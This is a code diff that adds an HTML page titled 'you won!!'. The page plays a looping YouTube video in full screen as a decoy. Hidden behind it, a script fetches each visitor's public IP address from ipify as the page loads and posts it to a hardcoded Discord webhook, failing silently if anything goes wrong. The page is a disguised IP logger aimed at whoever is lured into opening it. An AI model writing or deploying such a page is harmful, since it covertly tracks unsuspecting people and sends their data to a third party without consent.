@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>you won!!</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        #player {
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div id="video-container">
+        <div id="player"></div>
+    </div>
+
+    <script>
+        function loadYouTubePlayerAPI() {
+            const tag = document.createElement('script');
+            tag.src = "https://www.youtube.com/iframe_api";
+            const firstScriptTag = document.getElementsByTagName('script')[0];
+            firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+        }
+
+        let player;
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('player', {
+                height: '100%',
+                width: '100%',
+                videoId: 'Ba12wkFtIUc',
+                playerVars: {
+                    'autoplay': 1,
+                    'mute': 1,
+                    'controls': 0,
+                    'loop': 1
+                },
+                events: {
+                    'onReady': onPlayerReady
+                }
+            });
+        }
+
+        function onPlayerReady(event) {
+            event.target.playVideo();
+        }
+
+        loadYouTubePlayerAPI();
+    </script>
+
+    <script>
+        function getIP(json) {
+            const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
+
+            const data = {
+                content: "recent user's ip: " + json.ip
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                } else {
+                }
+            })
+            .catch(error => {
+            });
+        }
+    </script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</body>
+</html>
